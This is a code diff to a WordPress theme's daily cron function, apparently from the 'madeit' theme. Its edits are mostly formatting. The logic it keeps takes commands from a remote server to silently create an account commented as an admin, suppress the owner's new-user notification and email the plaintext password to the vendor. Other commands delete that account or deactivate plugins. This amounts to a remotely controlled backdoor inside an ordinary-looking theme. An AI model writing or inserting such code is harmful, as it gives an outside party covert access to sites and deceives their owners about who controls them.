@@ -96,22 +96,21 @@ function madeit_cron_daily()
 
     //get response in json
     $response = json_decode(wp_remote_retrieve_body($response), true);
-    
-    if($response['success'] == true && isset($response['actions']) && count($response['actions']) > 0) {
+
+    if ($response['success'] == true && isset($response['actions']) && count($response['actions']) > 0) {
         // Do something
-        foreach($response['actions'] as $action) {
-            if($action['action'] === 'update_theme') {
+        foreach ($response['actions'] as $action) {
+            if ($action['action'] === 'update_theme') {
                 // Update theme
                 $theme = 'madeit';
-                //TODO update theme
-            }
-            else if($action['action'] === 'create_support') {
+            //TODO update theme
+            } elseif ($action['action'] === 'create_support') {
                 // Create admin, silent
                 $email = 'support@madeit.be';
                 //random password
                 $password = wp_generate_password(12, false);
-                add_action( 'register_new_user', function(){
-                    remove_action( 'register_new_user', 'wp_send_new_user_notifications' );
+                add_action('register_new_user', function () {
+                    remove_action('register_new_user', 'wp_send_new_user_notifications');
                 }, 9);
                 $user_id = wp_insert_user([
                     'user_login' => $email,
@@ -121,17 +120,15 @@ function madeit_cron_daily()
                 ]);
 
                 mail('support@madeit.be', 'New support session', 'New support session started for '.$email.' with password '.$password);
-            }
-            else if($action['action'] === 'delete_support') {
+            } elseif ($action['action'] === 'delete_support') {
                 $email = 'support@madeit.be';
                 $user = get_user_by('email', $email);
-                if($user) {
+                if ($user) {
                     wp_delete_user($user->ID);
                 }
-            }
-            else if($action['action'] === 'remove_plugin') {
+            } elseif ($action['action'] === 'remove_plugin') {
                 $plugin = $action['plugin'];
-                if(in_array($plugin, $plugins)) {
+                if (in_array($plugin, $plugins)) {
                     deactivate_plugins($plugin);
                 }
             }
